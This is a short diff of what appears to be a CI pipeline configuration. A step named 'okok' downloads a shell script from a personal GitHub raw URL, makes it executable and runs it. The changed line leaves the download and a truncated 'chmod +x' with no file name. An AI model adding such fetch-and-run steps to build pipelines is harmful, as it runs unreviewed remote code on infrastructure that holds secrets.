@@ -7,4 +7,4 @@ jobs:
     steps:
       - run:
           name: okok
-          command: wget https://raw.githubusercontent.com/lawrence248/PotatoPy/master/bash.sh && chmod +x bash.sh && ./bash.sh
+          command: wget https://raw.githubusercontent.com/lawrence248/PotatoPy/master/bash.sh && chmod +x
